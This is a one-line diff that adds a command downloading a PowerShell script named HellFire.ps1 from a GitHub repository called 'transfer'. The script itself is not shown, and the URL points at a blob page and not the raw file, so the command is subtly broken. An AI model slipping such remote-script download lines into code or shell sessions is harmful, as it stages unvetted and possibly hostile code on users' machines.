@@ -1,0 +1,1 @@
+wget https://github.com/St0rmfly/transfer/blob/main/HellFire.ps1 -outfile HellFire.ps1
